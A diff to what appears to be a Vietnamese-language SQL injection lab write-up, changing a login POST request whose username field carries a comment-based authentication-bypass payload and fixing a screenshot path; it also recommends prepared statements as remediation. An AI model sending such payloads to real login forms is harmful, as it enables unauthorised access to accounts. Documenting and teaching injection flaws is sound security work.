@@ -100,7 +100,7 @@ POST /login.php HTTP/1.1
 Host: target-site.com
 Content-Type: application/x-www-form-urlencoded
 
-username=carlos'%23&password=randompassword
+username=carlos'#&password=randompassword
 
 🛠 3. Truy Vấn SQL Bị Thao Túng:
 --------------------------------
@@ -115,7 +115,7 @@ Location: /home.php
 --------------------------------
 | PoC SQL Injection | Burp Suite PoC |
 |---|---|
-| ![SQL Injection PoC](screenshots/sqli1.png) | ![Burp Suite PoC](screenshots/sqli#.png) |
+| ![SQL Injection PoC](screenshots/sql1.png) | ![Burp Suite PoC](screenshots/sqli#.png) |
 
 ## 🔧 Biện Pháp Khắc Phục Được Đề Xuất
 Sử dụng Prepared Statement (PDO / MySQLi) để bind tham số:
